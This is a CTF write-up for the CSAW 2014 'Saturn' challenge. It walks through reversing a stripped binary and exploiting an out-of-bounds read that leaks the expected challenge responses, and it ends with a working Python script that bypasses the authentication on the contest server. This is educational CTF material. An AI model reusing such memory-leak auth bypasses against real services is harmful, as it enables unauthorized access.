### Solved by

- **Superkojiman** as *My brain runs assembly code*
- **Barrebas** as *The silent disassembler ninja*
- **Swappage** as *The mumbler and random guesser*

Hello hello, Swappage here writing on behalf of the whole group that worked on this exploit dev :) please don't kill me as my English is really terrible, although it might also be Koji and Bas' fault for not reviewing this doc properly before publishing :p

During the past weekend me and a bunch of dudes from [VulnHub](http://vulnhub.com) decided to test ourselves and play the CSAW 2014 CTF challenge. Along wight he 300 point Forensics challenge, Saturn at exploitation 400 was one of the more interesting ones to solve. This is our writeup on it.

the question from the challenge stated:

*You have stolen the checking program for the CSAW Challenge-Response-Authentication-Protocol system. Unfortunately you forgot to grab the challenge-response keygen algorithm (libchallengeresponse.so). Can you still manage to bypass the secure system and read the flag?*

So basically our objective was to find a way to bypass the challenge-response handshake authentication process handled by this binary to read the flag; it was also obvious that we were missing a component, which was supposed to handle the task of generating the challenge response, and that we needed to live with it.

## Getting the binary to run
A quick check against the binary using ldd confirmed that we actually were missing a module which was needed for the application to run; relying simply on static analysis might be **extremely** frustrating and unproductive, so our first step was to make sure we could execute the binary locally to also perform dynamic analysis.
We came up with the following code snippet that we compiled as shared library:

Here is the .c snipplet

```c
	#include <stdio.h>
	#include <stdlib.h>

	int fillChallengeResponse() {
		return 0;
	}
```

and the .h

```c
	int fillChallengeResponse();
```

They were nothing but a dummy function but it was enough to be able to run the binary without it terminating.

## The application structure

By doing some static analysis we determined that saturn was made of three main parts:

- one responsible for providing the client a challenge
- one responsible for checking the response sent by the client to the server
- and the last one that would print out the flag if the response from the client was correct.

The access to these 3 branches was handled by something similar to a case switch, where the layout of the buffer sent by the client was verified for a sequence of commands as follows:

- if the first byte was in the range of 0xa0 to 0xaf the execution flow would get into the function responsible for providing the challenge to the client
- if the first byte was in the range of 0xe0 to 0xef the execution flow would get into the function responsible for checking the response
- if the first byte was a 0x80, the execution flow would get into the function responsible for printing the flag to stdout.

![](/images/2014/csaw/saturn/caseswitch.png)

At this point we knew that intended way to interact with the binary was to

- send the command sequence to request a challenge
- send the response
- send the command to receive the flag

## The genChallenge() function

Yes, i named it this way, in fact the binary was stripped, so while debugging using IDA i decided to rename it for making things easier :D
By the way...
The second step was to closely verify how the function responsible for providing the challenge to the client actually worked

``` c-objdump
	.text:0804885C                 push    ebp
	.text:0804885D                 mov     ebp, esp
	.text:0804885F                 push    ebx
	.text:08048860                 sub     esp, 34h
	.text:08048863                 mov     eax, [ebp+arg_0]
	.text:08048866                 mov     [ebp+var_1C], al
	.text:08048869                 movzx   eax, [ebp+var_1C]
	.text:0804886D                 and     eax, 0Fh			; <=====
	.text:08048870                 mov     [ebp+var_11], al
	.text:08048873                 mov     eax, off_804A050		; <=====
	...
	.text:080488B9                 mov     [esp+10h], ebx
	.text:080488BD                 mov     [esp+0Ch], ecx
	.text:080488C1                 mov     [esp+8], edx
	.text:080488C5                 mov     [esp+4], eax
	.text:080488C9                 mov     dword ptr [esp], offset format ; "%c%c%c%c"
	.text:080488D0                 call    _printf
	.text:080488D5                 mov     eax, ds:stdout
	.text:080488DA                 mov     [esp], eax      ; stream
	.text:080488DD                 call    _fflush
	.text:080488E2                 add     esp, 34h
	.text:080488E5                 pop     ebx
	.text:080488E6                 pop     ebp
```

We figured out that the challenge was read and returned to the client from a memory location controlled by the second digit of the byte, which meant that if we sent \xa0 we received 4 bytes, while if we were sending \xa1 we were receiving 4 other bytes.
This Part required a lot of testing and analysis by *talking* also to the real server, in fact we didn't have the library that would generate the challenge/response, and therefore these memory locations were all 0.

After a couple of trial and error, and thanks to superkojiman's smartness, we figured out that we could send a sequence of commands and read up to a total of 32 bytes of memory, by sending \xa0\xa1\xa2... and so on. (more on this later, as this is really important).

At this point we thought then, that the challenge, wasn't composed of 4 bytes, but probably by 32.

## The checkResponse() function

The check response function was the one responsible for actually verifying the validity of the response provided by the client.

To access this branch of code the client had to send the proper command, in the range of 0xe0 to 0xef followed by a sequence of 4 bytes representing (part) of the response.

``` c-objdump
	.text:080488E8                 push    ebp
	.text:080488E9                 mov     ebp, esp
	.text:080488EB                 sub     esp, 28h
	.text:080488EE                 mov     eax, [ebp+arg_0]
	.text:080488F1                 mov     [ebp+var_1C], al
	.text:080488F4                 movzx   eax, [ebp+var_1C]
	.text:080488F8                 and     eax, 0Fh
	.text:080488FB                 mov     [ebp+var_15], al
	.text:080488FE                 mov     eax, off_804A054		; <== the memory location from which the response is read
	.text:08048903                 movzx   edx, [ebp+var_15]
	.text:08048907                 shl     edx, 2
	.text:0804890A                 add     eax, edx
	.text:0804890C                 mov     eax, [eax]
	.text:0804890E                 mov     [ebp+var_10], eax
	.text:08048911                 mov     dword ptr [esp+8], 4 ; nbytes
	.text:08048919                 lea     eax, [ebp+buf]
	.text:0804891C                 mov     [esp+4], eax    ; buf
	.text:08048920                 mov     dword ptr [esp], 0 ; fd
	.text:08048927                 call    _read
	.text:0804892C                 mov     eax, [ebp+buf]
	.text:0804892F                 mov     [ebp+var_C], eax
	.text:08048932                 mov     eax, [ebp+var_C]
	.text:08048935                 cmp     eax, [ebp+var_10]
	.text:08048938                 jz      short loc_8048946
	.text:0804893A                 mov     dword ptr [esp], 0 ; status
	.text:08048941                 call    _exit
	.text:08048946
	.text:08048946 loc_8048946:
	.text:08048946                 movzx   eax, [ebp+var_15]
	.text:0804894A                 mov     ds:dword_804A0A0[eax*4], 1	; <== if bytes are correct this memory location is set to 1
	.text:08048955                 leave
	.text:08048956                 retn
```

Again, we missed the library responsible for generating the challenge response, so everything was 0 to us yet we could figure out that

- if the bytes were correct the memory location at address *dword_804A0A0[eax*4]* was set to 1
- if the bytes were wrong exit() was called instead causing the application to terminate.

At this point that was all we knew, as we were still missing an important part of the puzzle, which comes into play when the function that is supposed to finally open and read the flag for us is called.

## A matter of cycling

We thought we were really close to solving the puzzle, but we were obviously proved wrong.

If we take a look at the graph of the function responsible of opening the flag.txt file and then writing it to stdout, we can notice that there is a funny and evil function which i decided to name Cycles()

![](/images/2014/csaw/saturn/openfile.png)

Apparantly it looks like that depending on the return value of that function, we would or wouldn't be able to read the flag.

Let's give a quick look at the function

![](/images/2014/csaw/saturn/cycles.png)

The concept is as simple as this:

- the function cycles 8 times using the address pointed by ebp+var_4 as counter
- at first it zeroes out EAX
- then it moves the value from the memory location at address dword_804A0A0[eax*4 into EAX
- and it multiplies EAX by EBP+var_8 (which is always 1)
- at the end of the 8 iterations it returns the value in EAX

So, considering that to get to read the flag, the only way to do that was for this function to return 1, that meant that EAX had to be 1 after the 8 cycles ended
At this point the only way, was to have dword_804A0A0[eax*4 to contain 1.

But wait, where did i see this address before? it looks familiar...

If we get back to the function that checks the response (the one accessed by sending \xeN) we notice that the memory location is exactly the same

``` c-objdump
	.text:08048946                 movzx   eax, [ebp+var_15]
	.text:0804894A                 mov     ds:dword_804A0A0[eax*4], 1	; <== if bytes are correct this memory location is set to 1
	.text:08048955                 leave
	.text:08048956                 retn
```

``` c-objdump
	.text:08048803                 mov     eax, [ebp+var_4]
	.text:08048806                 mov     eax, ds:dword_804A0A0[eax*4]	; <== if this is 1, eax is 1
	.text:0804880D                 mov     edx, [ebp+var_8]
	.text:08048810                 imul    eax, edx
```
In the end, the purpose of this function then, was to perform a further check and see if the **whole** response was correct.. wait, what? the WHOLE? (more on this later)

## How we saw the light at the end of the tunnel

At this point everything was starting to make sense, but we were missing a point..
then all of a sudden we began to mumble about those 8 iterations

*8 iterations.. 8 iterations... but what if?...*

And that's how a simple guessing can lead to the solution, what if we needed to send 8 chunks of 4 bytes and build a whole response?
we thought, then that bitwise AND would make sense, we were able to get a total of 32 bytes of challenge from the server, maybe it's expecting us to send it 32 bytes, in chunk of 4.

we quickly tried that out by building a buffer that would at first pull 32 bytes of challenge 4 bytes at a time

	\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7

and then send the response with

	"\xe0" + <the four bytes received from \xa0> + "\xe1" + <the 4 bytes received from \xa1>.....*

and punched it to the server.. DAMN, no luck, it didn't work!
yet we were so close..

Then at a certain point, Barrebas, who was sitting silent working on reversing the binary said...

*"Wait.. the response is checked starting at a memory location that is 32 bytes away from where the challenge is read from"*

We saw the light! :D
we remembered that we could send commands from \xa0 to \xaf, which probably meant we could read past the 32 bytes of the challenge... what if we tried to verify with \xe0 the output from \xa8, and all the way onward to \xe7 with \xaf?

That would have probably sent the expected response to the server for each challenge request.. we tried and..
BAM! we got the flag!

	# ./updated.py
	CSAW ChallengeResponseAuthenticationProtocol Flag Storage

	flag{greetings_to_pure_digital}

Here is the script we used as exploit to retrieve the flag from the server

```python
	#!/usr/bin/env python

	from socket import *
	import sys, struct
	import time

	target = "54.85.89.65"
	#target = "127.0.0.1"

	s = socket(AF_INET, SOCK_STREAM)
	s.connect((target, 8888))

	print s.recv(1024)  # banner

	s.send("\xa8\xa9\xaa\xab\xac\xad\xae\xaf")
	c0 = s.recv(4)        # challenge 0
	c1 = s.recv(4)        # challenge 1
	c2 = s.recv(4)        # challenge 2
	c3 = s.recv(4)        # challenge 3
	c4 = s.recv(4)        # challenge 4
	c5 = s.recv(4)        # challenge 5
	c6 = s.recv(4)        # challenge 6
	c7 = s.recv(4)        # challenge 7

	challenge = c0 + c1 + c2 + c3 + c4 + c5 + c6 + c7

	buf = (
	"\xe0" + c0 +
	"\xe1" + c1 +
	"\xe2" + c2 +
	"\xe3" + c3 +
	"\xe4" + c4 +
	"\xe5" + c5 +
	"\xe6" + c6 +
	"\xe7" + c7 +
	"\x80"
	)
	s.send(buf)
	print s.recv(1024)
```
